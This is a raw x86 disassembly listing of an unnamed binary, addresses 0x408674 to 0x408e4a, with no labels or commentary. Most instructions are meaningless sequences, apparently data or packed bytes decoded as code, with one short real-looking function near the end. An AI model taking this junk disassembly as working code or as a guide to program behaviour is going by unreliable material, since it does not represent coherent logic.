  408674:	add    BYTE PTR [edi],cl
  408676:	inc    ebx
  408677:	inc    eax
  408678:	inc    eax
  408679:	add    BYTE PTR [ecx+0x43],al
  40867c:	add    eax,0x40256240
  408681:	bound  eax,QWORD PTR [eax]
  408683:	mov    edi,0xff1f1115
  408688:	xchg   ebx,eax
  408689:	cmc    
  40868a:	xor    eax,0x4042cb5c
  40868f:	push   esp
  408690:	push   edx
  408691:	call   0x468a5bd7
  408696:	adc    al,0xa1
  408698:	jae    0x408654
  40869a:	push   eax
  40869b:	int    0xc4
  40869d:	sub    al,0x40
  40869f:	cmp    edx,DWORD PTR [edx-0x1b]
  4086a2:	xor    BYTE PTR [ecx],dl
  4086a4:	retf   
  4086a5:	push   0x5b12110
  4086aa:	add    ah,cl
  4086ac:	inc    eax
  4086ad:	inc    ecx
  4086ae:	inc    eax
  4086af:	inc    ebx
  4086b0:	bound  esp,QWORD PTR ds:0x41400043
  4086b6:	add    BYTE PTR [eax],al
  4086b8:	add    eax,0x43624062
  4086bd:	inc    ecx
  4086be:	inc    eax
  4086bf:	inc    eax
  4086c0:	inc    eax
  4086c1:	add    eax,0x40624340
  4086c6:	add    eax,0x40664140
  4086cb:	dec    edx
  4086cc:	dec    ebp
  4086cd:	mov    al,ds:0x71400238
  4086d2:	pop    edi
  4086d3:	cmc    
  4086d4:	jnp    0x4086e3
  4086d6:	or     cl,cl
  4086d8:	sbb    DWORD PTR [edi-0x2b],esp
  4086db:	sub    edi,DWORD PTR [eax+0x40b443cd]
  4086e1:	jl     0x4086a2
  4086e3:	xchg   edx,eax
  4086e4:	or     eax,0x12052658
  4086e9:	popa   
  4086ea:	push   0x4d
  4086ec:	inc    ecx
  4086ed:	inc    eax
  4086ee:	adc    BYTE PTR [edx+0x40],al
  4086f1:	mov    edi,0x40050043
  4086f6:	js     0x408708
  4086f8:	inc    ecx
  4086f9:	bound  eax,QWORD PTR [eax+0x40]
  4086fc:	sldt   WORD PTR [eax-0x34]
  408700:	js     0x408764
  408702:	add    eax,0x40664143
  408707:	inc    ebx
  408708:	add    BYTE PTR [ecx+0x5],al
  40870b:	js     0x40874d
  40870d:	bound  eax,QWORD PTR [eax+0x0]
  408710:	inc    eax
  408711:	ja     0x4086d8
  408713:	popf   
  408714:	inc    eax
  408715:	test   al,0x21
  408717:	add    eax,DWORD PTR [eax+0x42]
  40871a:	mov    ebp,0x20103890
  40871f:	inc    eax
  408720:	loopne 0x4086f5
  408722:	or     esp,DWORD PTR [edx-0x58]
  408725:	mov    al,0x91
  408727:	add    eax,0x3b44432e
  40872c:	add    eax,0x4341bf41
  408731:	inc    eax
  408732:	inc    eax
  408733:	add    eax,0x434162
  408738:	inc    eax
  408739:	add    BYTE PTR [edx+0x5],ah
  40873c:	inc    eax
  40873d:	adc    BYTE PTR [edx+0x40],ah
  408740:	inc    ebx
  408741:	inc    ecx
  408742:	add    eax,0x4340
  408747:	add    eax,0x404162
  40874c:	add    BYTE PTR [eax+0x43],al
  40874f:	inc    eax
  408750:	add    eax,0x94715540
  408755:	test   eax,0x470c187
  40875a:	mov    al,ds:0x40450740
  40875f:	mov    BYTE PTR [eax],cl
  408761:	inc    eax
  408762:	sub    DWORD PTR [edx],edx
  408764:	jl     0x408711
  408766:	inc    eax
  408767:	(bad)  
  408768:	retf   
  408769:	inc    eax
  40876a:	jle    0x408775
  40876c:	inc    ebx
  40876d:	inc    ecx
  40876e:	inc    eax
  40876f:	pop    edi
  408770:	mov    edi,0xa444e140
  408775:	add    al,0x40
  408777:	xor    al,0xbf
  408779:	inc    eax
  40877a:	add    eax,edx
  40877c:	xchg   ecx,eax
  40877d:	in     al,dx
  40877e:	mov    al,ds:0x21409532
  408783:	psrad  mm0,mm4
  408786:	inc    eax
  408787:	add    BYTE PTR [eax],al
  408789:	inc    ecx
  40878a:	inc    ebx
  40878b:	add    eax,0x41784062
  408790:	inc    eax
  408791:	inc    eax
  408792:	add    BYTE PTR [edi],cl
  408794:	bound  eax,QWORD PTR [ebx+0x0]
  408797:	add    eax,0x25006240
  40879c:	inc    eax
  40879d:	add    eax,0x40254143
  4087a2:	add    eax,0x5620000
  4087a7:	and    al,BYTE PTR [esp+ecx*1+0x78]
  4087ab:	inc    edx
  4087ac:	daa    
  4087ad:	adc    eax,DWORD PTR [edi-0x1ebfb9f1]
  4087b3:	shl    BYTE PTR [ecx],1
  4087b5:	int    0xbf
  4087b7:	addr16 push esp
  4087b9:	or     eax,0x4e32b575
  4087be:	mov    edi,0x6240d841
  4087c3:	inc    edx
  4087c4:	xchg   ebp,eax
  4087c5:	xor    eax,0x43bf
  4087ca:	add    BYTE PTR [ecx+0x40],al
  4087cd:	bound  esp,QWORD PTR [esi+0x0]
  4087d0:	inc    eax
  4087d1:	add    eax,0x5400000
  4087d6:	inc    ecx
  4087d7:	inc    eax
  4087d8:	inc    eax
  4087d9:	bound  esp,QWORD PTR ds:0x25050043
  4087df:	inc    ecx
  4087e0:	inc    ebx
  4087e1:	inc    eax
  4087e2:	test   BYTE PTR [eax+0x0],al
  4087e5:	bound  ebx,QWORD PTR [eax+0x62]
  4087e8:	inc    ecx
  4087e9:	inc    eax
  4087ea:	fs gs adc al,0xef
  4087ee:	fbld   TBYTE PTR [eax]
  4087f0:	sub    BYTE PTR [ecx*4+0x73284068],0x1
  4087f8:	(bad)
  4087fb:	bound  ecx,QWORD PTR [eax]
  4087fd:	cmp    BYTE PTR [edx-0x5c],al
  408800:	inc    ecx
  408801:	leave  
  408802:	aam    0x41
  408804:	inc    eax
  408805:	repz aam 0xc
  408808:	and    esp,DWORD PTR [esi]
  40880a:	sub    dl,ch
  40880c:	outs   dx,BYTE PTR ds:[esi]
  40880d:	cmp    BYTE PTR [edx],al
  40880f:	sub    eax,ebp
  408811:	and    BYTE PTR [edi-0x3],0x40
  408815:	inc    DWORD PTR [eax+0x50]
  408818:	fs jae 0x40885d
  40881b:	mov    ah,0xe
  40881d:	and    eax,0xbf841e05
  408822:	adc    BYTE PTR [edx+0x40],ah
  408825:	inc    ecx
  408826:	and    eax,0x40000500
  40882b:	inc    ebx
  40882c:	add    eax,0x40624041
  408831:	inc    ebx
  408832:	add    eax,0x43402541
  408837:	bound  eax,QWORD PTR [eax+0x43]
  40883a:	int3   
  40883b:	inc    eax
  40883c:	bound  eax,QWORD PTR [eax]
  40883e:	inc    ecx
  40883f:	inc    eax
  408840:	inc    eax
  408841:	add    eax,0x40056305
  408846:	jg     0x4088c1
  408848:	jnp    0x4087f2
  40884a:	mov    edi,0x770fcb42
  40884f:	mov    al,0x2e
  408851:	adc    bh,BYTE PTR [edi+0x2340022a]
  408857:	jb     0x4088b9
  408859:	mov    esp,0x2540622a
  40885e:	add    BYTE PTR [esi+0x40],ah
  408861:	add    eax,0x40404143
  408866:	inc    ebx
  408867:	add    BYTE PTR [eax],al
  408869:	add    BYTE PTR [edx-0x34],ah
  40886c:	inc    eax
  40886d:	add    eax,0x40004041
  408872:	inc    ecx
  408873:	int3   
  408874:	add    BYTE PTR [ebx-0x7c],al
  408877:	add    eax,0x5406240
  40887c:	bound  edx,QWORD PTR [eax]
  40887e:	inc    ecx
  40887f:	or     DWORD PTR [edx+eiz*8],esp
  408882:	mov    BYTE PTR [ecx-0x2b],al
  408885:	mov    BYTE PTR [esi-0x32bf9dc0],al
  40888b:	cwde   
  40888c:	leave  
  40888d:	inc    ecx
  40888e:	int3   
  40888f:	adc    al,0x21
  408891:	mov    al,0x48
  408893:	test   al,0x26
  408895:	addr16 fs inc eax
  408898:	and    ecx,DWORD PTR [edi]
  40889a:	dec    ebp
  40889b:	arpl   WORD PTR [eax+0x4c],ax
  40889e:	adc    DWORD PTR [ebx],eax
  4088a0:	popa   
  4088a1:	inc    eax
  4088a2:	mov    ch,0x48
  4088a4:	inc    eax
  4088a5:	push   0x143d40c9
  4088aa:	mov    edx,0xac7a4008
  4088af:	adc    eax,0x434f4250
  4088b4:	push   cs
  4088b5:	sub    al,0x15
  4088b7:	inc    eax
  4088b8:	ja     0x4088fa
  4088ba:	bound  ebx,QWORD PTR [eax+0x41]
  4088bd:	add    eax,0x40404340
  4088c2:	inc    ebx
  4088c3:	inc    eax
  4088c4:	test   BYTE PTR [eax],al
  4088c6:	add    eax,0x40624041
  4088cb:	inc    eax
  4088cc:	add    BYTE PTR [edx+0x5],ah
  4088cf:	inc    ebx
  4088d0:	add    BYTE PTR [eax+0x78],al
  4088d3:	inc    ecx
  4088d4:	add    BYTE PTR [eax+0x41],bl
  4088d7:	bound  esi,QWORD PTR [eax+0x7d]
  4088da:	mov    eax,0x1242a0fa
  4088df:	push   eax
  4088e0:	inc    edx
  4088e1:	and    ecx,DWORD PTR ds:0x401e81bf
  4088e7:	jg     0x408968
  4088e9:	and    eax,DWORD PTR [edx-0x41]
  4088ec:	mov    ah,0x30
  4088ee:	adc    al,0x50
  4088f0:	jb     0x408938
  4088f2:	sbb    bh,BYTE PTR [edi+0x7f40ac05]
  4088f8:	inc    edx
  4088f9:	sub    al,0x24
  4088fb:	sub    bl,cl
  4088fd:	add    eax,0x99710a13
  408902:	inc    esp
  408903:	push   ecx
  408904:	inc    edx
  408905:	leave  
  408906:	inc    eax
  408907:	(bad)  
  408908:	int    0x40
  40890a:	test   BYTE PTR [eax],al
  40890c:	int3   
  40890d:	bound  eax,QWORD PTR ds:0xcc840f41
  408913:	inc    ebx
  408914:	add    BYTE PTR [eax+0x0],al
  408917:	inc    eax
  408918:	inc    eax
  408919:	inc    eax
  40891a:	int3   
  40891b:	add    BYTE PTR ds:0x62404341,al
  408921:	pop    eax
  408922:	add    BYTE PTR [ebx+0x40],al
  408925:	bound  ecx,QWORD PTR [edi]
  408927:	inc    eax
  408928:	push   esp
  408929:	adc    DWORD PTR [eax-0x79],eax
  40892c:	inc    esp
  40892d:	push   cs
  40892e:	sub    eax,DWORD PTR [ecx+0x41]
  408931:	cmp    al,0x69
  408933:	fadd   QWORD PTR [ecx+0x40]
  408936:	dec    ebp
  408937:	rcr    BYTE PTR [edx+ecx*4],1
  40893a:	mov    al,0x6c
  40893c:	dec    edi
  40893d:	or     DWORD PTR [eax+0xe],esp
  408940:	punpckldq mm3,DWORD PTR [ecx]
  408943:	icebp  
  408944:	sub    BYTE PTR [eax+0x21],al
  408947:	inc    eax
  408948:	retf   0x3040
  40894b:	sub    BYTE PTR [edi+0x1f],bl
  40894e:	pop    eax
  40894f:	or     DWORD PTR ds:0x30655a20,esp
  408955:	inc    eax
  408956:	mov    ds:0x7b678975,al
  40895b:	(bad)  
  40895c:	test   al,0x14
  40895e:	mov    ch,0x10
  408960:	lods   al,BYTE PTR ds:[esi]
  408961:	add    BYTE PTR [eax],al
  408963:	inc    eax
  408964:	inc    eax
  408965:	cmovno eax,DWORD PTR ds:0x40056243
  40896c:	int3   
  40896d:	add    ah,cl
  40896f:	inc    eax
  408970:	inc    eax
  408971:	bound  eax,QWORD PTR [ecx+0x0]
  408974:	add    BYTE PTR [edi],cl
  408976:	inc    ebx
  408977:	inc    eax
  408978:	inc    eax
  408979:	add    BYTE PTR [ecx+0x43],al
  40897c:	add    eax,0x40256240
  408981:	bound  eax,QWORD PTR [eax]
  408983:	inc    ebp
  408984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408985:	sub    BYTE PTR [eax],dl
  408987:	inc    eax
  408988:	pop    ds
  408989:	or     eax,0x804c43bd
  40898e:	inc    ecx
  40898f:	adc    BYTE PTR [esi+0x40],cl
  408992:	and    al,BYTE PTR [ecx+0x40809814]
  408998:	popa   
  408999:	pop    ds
  40899a:	mov    ecx,0xc36d529c
  40899f:	sbb    DWORD PTR [ecx-0x38],eax
  4089a2:	cmp    bh,BYTE PTR [eax+0x4d]
  4089a5:	jp     0x4089eb
  4089a7:	inc    eax
  4089a8:	pusha  
  4089a9:	inc    eax
  4089aa:	and    al,0x63
  4089ac:	lods   al,BYTE PTR ds:[esi]
  4089ad:	fsubr  QWORD PTR [ecx+0x12]
  4089b0:	and    eax,0x19482bd0
  4089b5:	gs mov al,0x5
  4089b8:	add    ah,cl
  4089ba:	inc    eax
  4089bb:	inc    ecx
  4089bc:	inc    eax
  4089bd:	inc    ebx
  4089be:	bound  esp,QWORD PTR ds:0x41400043
  4089c4:	add    BYTE PTR [eax],al
  4089c6:	add    eax,0x43624062
  4089cb:	inc    ecx
  4089cc:	inc    eax
  4089cd:	inc    eax
  4089ce:	inc    eax
  4089cf:	add    eax,0x40624340
  4089d4:	add    eax,0x40664140
  4089d9:	inc    eax
  4089da:	inc    edi
  4089db:	add    ebp,eax
  4089dd:	xor    DWORD PTR [eax],0x210362ff
  4089e3:	arpl   WORD PTR [eax-0x4427a53d],ax
  4089e9:	inc    eax
  4089ea:	jg     0x4089fc
  4089ec:	push   ebx
  4089ed:	icebp  
  4089ee:	ins    DWORD PTR es:[edi],dx
  4089ef:	out    dx,al
  4089f0:	sub    BYTE PTR ds:0x3f2c16e2,al
  4089f6:	xchg   esp,eax
  4089f7:	ret    
  4089f8:	jge    0x408a3a
  4089fa:	pusha  
  4089fb:	inc    ebx
  4089fc:	add    BYTE PTR ds:0x41107840,al
  408a02:	bound  eax,QWORD PTR [eax+0x40]
  408a05:	sldt   WORD PTR [eax-0x34]
  408a09:	js     0x408a6d
  408a0b:	add    eax,0x40664143
  408a10:	inc    ebx
  408a11:	add    BYTE PTR [ecx+0x5],al
  408a14:	js     0x408a56
  408a16:	bound  eax,QWORD PTR [eax+0x0]
  408a19:	inc    eax
  408a1a:	sbb    eax,ebx
  408a1c:	ror    BYTE PTR [eax+0x4f],cl
  408a1f:	aam    0x4
  408a21:	dec    ebx
  408a22:	jo     0x408a3a
  408a24:	fdivr  QWORD PTR [esp+eax*2]
  408a27:	outs   dx,BYTE PTR ds:[esi]
  408a28:	inc    eax
  408a29:	mov    al,ds:0x205ec305
  408a2e:	adc    DWORD PTR [eax+0x40],esp
  408a31:	sub    eax,0xc5a89318
  408a36:	jnp    0x408a9c
  408a38:	inc    eax
  408a39:	imul   edx,DWORD PTR [eax-0x4ba7ef3b],0x656a1469
  408a43:	xchg   DWORD PTR [ecx-0x36],ecx
  408a46:	adc    eax,0xeae040a8
  408a4b:	mov    ah,0x2f
  408a4d:	push   ss
  408a4e:	inc    ebp
  408a4f:	adc    DWORD PTR [eax],ebx
  408a51:	and    eax,0x43419451
  408a56:	inc    eax
  408a57:	inc    eax
  408a58:	add    eax,0x434162
  408a5d:	inc    eax
  408a5e:	add    BYTE PTR [edx+0x5],ah
  408a61:	inc    eax
  408a62:	adc    BYTE PTR [edx+0x40],ah
  408a65:	inc    ebx
  408a66:	inc    ecx
  408a67:	add    eax,0x4340
  408a6c:	add    eax,0x404162
  408a71:	add    BYTE PTR [eax+0x43],al
  408a74:	inc    eax
  408a75:	add    eax,0x64714de1
  408a7a:	inc    eax
  408a7b:	jle    0x408a2d
  408a7d:	cmc    
  408a7e:	push   ds
  408a7f:	sub    eax,0x61144124
  408a84:	jno    0x408a97
  408a86:	adc    DWORD PTR [esi],ebx
  408a88:	bound  ecx,QWORD PTR [ebp+0x40]
  408a8b:	inc    ecx
  408a8c:	push   eax
  408a8d:	inc    eax
  408a8e:	add    BYTE PTR [eax],al
  408a90:	inc    ecx
  408a91:	inc    ebx
  408a92:	add    eax,0x41784062
  408a97:	inc    eax
  408a98:	inc    eax
  408a99:	add    BYTE PTR [edi],cl
  408a9b:	bound  eax,QWORD PTR [ebx+0x0]
  408a9e:	add    eax,0x25006240
  408aa3:	inc    eax
  408aa4:	add    eax,0x40254143
  408aa9:	add    eax,0x2d620000
  408aae:	(bad)  
  408aaf:	aad    0x9b
  408ab1:	shr    BYTE PTR [esi+0x60],0xb1
  408ab5:	popf   
  408ab6:	repnz push ebp
  408ab8:	pushf  
  408ab9:	cmp    al,0x40
  408abb:	xor    ecx,edx
  408abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408abe:	sub    dh,dh
  408ac0:	imul   edx,DWORD PTR [ebp-0x544f98f2],0x593c5c22
  408aca:	inc    eax
  408acb:	gs aaa 
  408acd:	pop    edx
  408ace:	leave  
  408acf:	inc    ebx
  408ad0:	add    BYTE PTR [eax],al
  408ad2:	add    BYTE PTR [ecx+0x40],al
  408ad5:	bound  esp,QWORD PTR [esi+0x0]
  408ad8:	inc    eax
  408ad9:	add    eax,0x5400000
  408ade:	inc    ecx
  408adf:	inc    eax
  408ae0:	inc    eax
  408ae1:	bound  esp,QWORD PTR ds:0x25050043
  408ae7:	inc    ecx
  408ae8:	inc    ebx
  408ae9:	inc    eax
  408aea:	test   BYTE PTR [eax+0x0],al
  408aed:	bound  ebx,QWORD PTR [eax+0x62]
  408af0:	inc    ecx
  408af1:	inc    eax
  408af2:	and    BYTE PTR [esi+eiz*2-0x65d4a5f1],dl
  408af9:	add    DWORD PTR [eax+eiz*4],ebx
  408afc:	dec    eax
  408afd:	inc    eax
  408afe:	and    dl,cl
  408b00:	xchg   esp,eax
  408b01:	addr16 int 0x15
  408b04:	push   0x3d531b09
  408b09:	inc    esp
  408b0a:	push   edi
  408b0b:	leave  
  408b0c:	popa   
  408b0d:	inc    eax
  408b0e:	push   0x922cc4b3
  408b13:	inc    esp
  408b14:	arpl   WORD PTR [eax+eax*2],dx
  408b17:	inc    edi
  408b18:	(bad)  
  408b19:	sbb    eax,0x406111c5
  408b1e:	pop    ds
  408b1f:	adc    eax,0xcb9c0d01
  408b24:	or     al,0x10
  408b26:	bound  eax,QWORD PTR [eax+0x41]
  408b29:	and    eax,0x40000500
  408b2e:	inc    ebx
  408b2f:	add    eax,0x40624041
  408b34:	inc    ebx
  408b35:	add    eax,0x43402541
  408b3a:	bound  eax,QWORD PTR [eax+0x43]
  408b3d:	int3   
  408b3e:	inc    eax
  408b3f:	bound  eax,QWORD PTR [eax]
  408b41:	inc    ecx
  408b42:	inc    eax
  408b43:	inc    eax
  408b44:	add    eax,0xf7600305
  408b49:	sahf   
  408b4a:	test   al,0x52
  408b4c:	mov    esp,0x80440d1
  408b51:	mov    bl,0x50
  408b53:	lds    ecx,FWORD PTR ds:0x7d6f1562
  408b59:	stc    
  408b5a:	sub    dl,BYTE PTR [ebp+eax*2+0x43]
  408b5e:	inc    eax
  408b5f:	inc    esi
  408b60:	add    dh,BYTE PTR [ecx]
  408b62:	cmp    bh,ch
  408b64:	xchg   edx,eax
  408b65:	inc    eax
  408b66:	adc    al,BYTE PTR [ebp-0x7cbf7e9]
  408b6c:	pushf  
  408b6d:	mov    ds:0x2a4b4840,al
  408b72:	inc    esp
  408b73:	mov    ss,WORD PTR [ebx-0x7f]
  408b76:	adc    al,0x0
  408b78:	jno    0x408b6a
  408b7a:	inc    ebp
  408b7b:	mov    ebp,eax
  408b7d:	inc    eax
  408b7e:	inc    eax
  408b7f:	daa    
  408b80:	bound  eax,QWORD PTR [eax+0x25]
  408b83:	add    BYTE PTR [esi+0x40],ah
  408b86:	add    eax,0x40404143
  408b8b:	inc    ebx
  408b8c:	add    BYTE PTR [eax],al
  408b8e:	add    BYTE PTR [edx-0x34],ah
  408b91:	inc    eax
  408b92:	add    eax,0x40004041
  408b97:	inc    ecx
  408b98:	int3   
  408b99:	add    BYTE PTR [ebx-0x7c],al
  408b9c:	add    eax,0x5406240
  408ba1:	bound  edi,QWORD PTR [esi+0x60]
  408ba4:	cmp    BYTE PTR [edx+0x4f],bl
  408ba7:	inc    edx
  408ba8:	adc    edx,DWORD PTR [esi+0x31]
  408bab:	mov    dl,0x45
  408bad:	aad    0x44
  408baf:	icebp  
  408bb0:	inc    eax
  408bb1:	std    
  408bb2:	push   ecx
  408bb3:	pop    ebp
  408bb4:	jnp    0x408b79
  408bb6:	es enter 0x10e,0x71
  408bbb:	idiv   DWORD PTR [eax+0x40626a9d]
  408bc1:	inc    esp
  408bc2:	dec    eax
  408bc3:	push   eax
  408bc4:	add    eax,0x93dac19
  408bc9:	xor    BYTE PTR [ecx+0x24],0xcb
  408bcd:	xor    BYTE PTR [ebx+0x2a],bh
  408bd0:	inc    eax
  408bd1:	and    DWORD PTR [ecx-0x30],ebp
  408bd4:	inc    edx
  408bd5:	pop    edx
  408bd6:	imul   eax,DWORD PTR [eax+0x1f],0x58624072
  408bdd:	inc    ecx
  408bde:	add    eax,0x40404340
  408be3:	inc    ebx
  408be4:	inc    eax
  408be5:	test   BYTE PTR [eax],al
  408be7:	add    eax,0x40624041
  408bec:	inc    eax
  408bed:	add    BYTE PTR [edx+0x5],ah
  408bf0:	inc    ebx
  408bf1:	add    BYTE PTR [eax+0x78],al
  408bf4:	inc    ecx
  408bf5:	add    BYTE PTR [eax+0x41],bl
  408bf8:	(bad)  
  408bf9:	hlt    
  408bfa:	call   DWORD PTR [edx+0x404062cd]
  408c00:	add    DWORD PTR [ebx*2+0x40c947d4],esp
  408c07:	adc    al,0x73
  408c09:	mov    esi,0xa8ed80d1
  408c0e:	fild   DWORD PTR [eax-0x7f]
  408c11:	sub    eax,0x548dca7
  408c16:	lds    edx,FWORD PTR [eax]
  408c18:	inc    eax
  408c19:	push   ecx
  408c1a:	inc    eax
  408c1b:	test   BYTE PTR [eax],al
  408c1d:	int3   
  408c1e:	bound  eax,QWORD PTR ds:0xcc840f41
  408c24:	inc    ebx
  408c25:	add    BYTE PTR [eax+0x0],al
  408c28:	inc    eax
  408c29:	inc    eax
  408c2a:	inc    eax
  408c2b:	int3   
  408c2c:	add    BYTE PTR ds:0x62404341,al
  408c32:	pop    eax
  408c33:	add    BYTE PTR [ebx+0x40],al
  408c36:	bound  ecx,QWORD PTR [edi]
  408c38:	inc    eax
  408c39:	clc    
  408c3a:	idiv   DWORD PTR [ebx+edi*4]
  408c3d:	dec    edi
  408c3e:	inc    eax
  408c3f:	add    BYTE PTR [esi+0x6d],0x27
  408c43:	adc    al,0x3b
  408c45:	cmp    ebx,DWORD PTR [ecx]
  408c47:	sub    edx,DWORD PTR [ecx]
  408c49:	inc    edi
  408c4a:	or     eax,0x40b962c5
  408c4f:	sbb    BYTE PTR [eax+0x3e],0x63
  408c53:	(bad)  
  408c54:	arpl   bx,ax
  408c56:	adc    al,BYTE PTR [edx-0x6da30e6f]
  408c5c:	xchg   ebx,eax
  408c5d:	push   eax
  408c5e:	inc    eax
  408c5f:	popf   
  408c60:	add    eax,0x9919203c
  408c65:	dec    esp
  408c66:	add    eax,DWORD PTR [eax]
  408c68:	add    BYTE PTR [eax+0x40],al
  408c6b:	cmovno eax,DWORD PTR ds:0x40056243
  408c72:	int3   
  408c73:	add    ah,cl
  408c75:	inc    eax
  408c76:	inc    eax
  408c77:	bound  eax,QWORD PTR [ecx+0x0]
  408c7a:	add    BYTE PTR [edi],cl
  408c7c:	inc    ebx
  408c7d:	inc    eax
  408c7e:	inc    eax
  408c7f:	add    BYTE PTR [ecx+0x43],al
  408c82:	add    eax,0x40256240
  408c87:	bound  eax,QWORD PTR [eax]
  408c89:	outs   dx,BYTE PTR ds:[esi]
  408c8a:	xchg   esp,eax
  408c8b:	std    
  408c8c:	xor    BYTE PTR [eax],dh
  408c8e:	push   ebx
  408c8f:	inc    BYTE PTR [eax+0x60]
  408c92:	es dec ecx
  408c94:	rcr    DWORD PTR [edx-0x3d],0x4f
  408c98:	add    eax,0xa8f61d00
  408c9d:	push   ebx
  408c9e:	jne    0x408c5c
  408ca0:	inc    eax
  408ca1:	and    eax,0x80400c76
  408ca6:	or     DWORD PTR [ebp+0x4],0x16b2540
  408cad:	cli    
  408cae:	pop    edx
  408caf:	xchg   ecx,eax
  408cb0:	inc    eax
  408cb1:	add    BYTE PTR [eax+0x5],dl
  408cb4:	add    ah,cl
  408cb6:	inc    eax
  408cb7:	inc    ecx
  408cb8:	inc    eax
  408cb9:	inc    ebx
  408cba:	bound  esp,QWORD PTR ds:0x41400043
  408cc0:	add    BYTE PTR [eax],al
  408cc2:	add    eax,0x43624062
  408cc7:	inc    ecx
  408cc8:	inc    eax
  408cc9:	inc    eax
  408cca:	inc    eax
  408ccb:	add    eax,0x40624340
  408cd0:	add    eax,0x40664140
  408cd5:	xlat   BYTE PTR ds:[ebx]
  408cd6:	xor    DWORD PTR [esi+0x6f40e4b4],ecx
  408cdc:	icebp  
  408cdd:	xchg   edx,eax
  408cde:	mov    al,0x89
  408ce0:	push   esp
  408ce1:	arpl   WORD PTR [eax-0x58],ax
  408ce4:	mov    ch,0x99
  408ce6:	sub    BYTE PTR [edx-0x79],bl
  408ce9:	ins    DWORD PTR es:[edi],dx
  408cea:	and    al,0x43
  408cec:	add    BYTE PTR ds:0x41107840,al
  408cf2:	bound  eax,QWORD PTR [eax+0x40]
  408cf5:	sldt   WORD PTR [eax-0x34]
  408cf9:	js     0x408d5d
  408cfb:	add    eax,0x40664143
  408d00:	inc    ebx
  408d01:	add    BYTE PTR [ecx+0x5],al
  408d04:	js     0x408d46
  408d06:	bound  eax,QWORD PTR [eax+0x0]
  408d09:	inc    eax
  408d0a:	add    al,BYTE PTR [eax-0x38]
  408d0d:	inc    eax
  408d0e:	int    0xa8
  408d10:	mov    WORD PTR [eax+0x34],es
  408d13:	xor    eax,0x604b40a0
  408d18:	bound  eax,QWORD PTR [eax-0x51]
  408d1b:	aaa    
  408d1c:	xchg   ebp,eax
  408d1d:	adc    al,BYTE PTR [ebp-0x7ebf0662]
  408d23:	push   ebp
  408d24:	test   eax,0x417f2d79
  408d29:	inc    ebx
  408d2a:	inc    eax
  408d2b:	inc    eax
  408d2c:	add    eax,0x434162
  408d31:	inc    eax
  408d32:	add    BYTE PTR [edx+0x5],ah
  408d35:	inc    eax
  408d36:	adc    BYTE PTR [edx+0x40],ah
  408d39:	inc    ebx
  408d3a:	inc    ecx
  408d3b:	add    eax,0x4340
  408d40:	add    eax,0x404162
  408d45:	add    BYTE PTR [eax+0x43],al
  408d48:	inc    eax
  408d49:	add    eax,0x56152340
  408d4e:	pop    esi
  408d4f:	sub    BYTE PTR [esi+ebx*4+0x40],cl
  408d53:	inc    eax
  408d54:	cmp    al,0x17
  408d56:	cmp    DWORD PTR [edx+0x5a],ecx
  408d59:	test   al,0x40
  408d5b:	inc    eax
  408d5c:	add    dl,BYTE PTR [esp+ebx*4+0x56]
  408d60:	lds    eax,FWORD PTR [ebp-0x1]
  408d63:	inc    eax
  408d64:	es xor bh,al
  408d67:	xor    al,0x54
  408d69:	inc    ecx
  408d6a:	(bad)  
  408d6b:	and    ch,BYTE PTR [ecx+0x21]
  408d6e:	in     al,0x32
  408d70:	icebp  
  408d71:	and    BYTE PTR [edi+0x40],cl
  408d74:	add    bl,BYTE PTR [ebp+0x4e]
  408d77:	cmp    BYTE PTR [ebx-0x1c],dl
  408d7a:	inc    edx
  408d7b:	inc    eax
  408d7c:	sub    BYTE PTR [ebx-0x65],dh
  408d7f:	in     al,dx
  408d80:	and    BYTE PTR [edx-0x50],ah
  408d83:	inc    eax
  408d84:	inc    ebx
  408d85:	add    al,cl
  408d87:	inc    eax
  408d88:	add    BYTE PTR [eax],al
  408d8a:	inc    ecx
  408d8b:	inc    ebx
  408d8c:	add    eax,0x41784062
  408d91:	inc    eax
  408d92:	inc    eax
  408d93:	add    BYTE PTR [edi],cl
  408d95:	bound  eax,QWORD PTR [ebx+0x0]
  408d98:	add    eax,0x25006240
  408d9d:	inc    eax
  408d9e:	add    eax,0x40254143
  408da3:	add    eax,0x28620000
  408da8:	or     al,0x1a
  408daa:	inc    esi
  408dab:	and    DWORD PTR [ecx-0x2ab48d8f],eax
  408db1:	test   eax,0x76704041
  408db6:	fdivp  st(6),st
  408db8:	dec    ebp
  408db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dba:	les    eax,FWORD PTR [eax+0x1]
  408dbd:	adc    DWORD PTR [esp+ecx*2],esp
  408dc0:	loop   0x408e33
  408dc2:	mov    DWORD PTR [eax+0x32],eax
  408dc5:	mov    bh,0xd5
  408dc7:	mov    al,ds:0x50c47ffa
  408dcc:	add    BYTE PTR [eax-0x1d],dl
  408dcf:	cmp    bh,al
  408dd1:	bound  ecx,QWORD PTR [edi+0x40]
  408dd4:	sub    DWORD PTR [edx],edx
  408dd6:	test   eax,0x4050993c
  408ddb:	inc    eax
  408ddc:	out    dx,al
  408ddd:	inc    ebx
  408dde:	add    BYTE PTR [eax],al
  408de0:	add    BYTE PTR [ecx+0x40],al
  408de3:	bound  esp,QWORD PTR [esi+0x0]
  408de6:	inc    eax
  408de7:	add    eax,0xcccccccc
  408dec:	int3   
  408ded:	int3   
  408dee:	int3   
  408def:	int3   
  408df0:	mov    ecx,DWORD PTR ds:0x4253d2
  408df6:	test   ecx,ecx
  408df8:	je     0x408e33
  408dfa:	dec    eax
  408dfb:	mov    edi,0x425281
  408e00:	dec    eax
  408e01:	mov    esi,0x421018
  408e06:	test   eax,eax
  408e08:	je     0x408e33
  408e0a:	mov    ebx,DWORD PTR [esi]
  408e0c:	mov    esi,0x41fda4
  408e11:	push   ebx
  408e12:	call   0x41fcd0
  408e17:	mov    esi,edi
  408e19:	mov    eax,0x64
  408e1e:	add    DWORD PTR ds:0x4253db,eax
  408e24:	mov    ecx,DWORD PTR [esi]
  408e26:	pop    eax
  408e27:	mov    ds:0x4253e7,eax
  408e2c:	push   ecx
  408e2d:	push   eax
  408e2e:	call   0x4053c0
  408e33:	ret    
  408e34:	int3   
  408e35:	int3   
  408e36:	int3   
  408e37:	int3   
  408e38:	int3   
  408e39:	int3   
  408e3a:	int3   
  408e3b:	int3   
  408e3c:	int3   
  408e3d:	int3   
  408e3e:	int3   
  408e3f:	int3   
  408e40:	inc    eax
  408e41:	pusha  
  408e42:	loope  0x408e69
  408e44:	mov    ebx,0x40f952dc
  408e49:	lods   eax,DWORD PTR ds:[esi]
  408e4a:	dec    eax
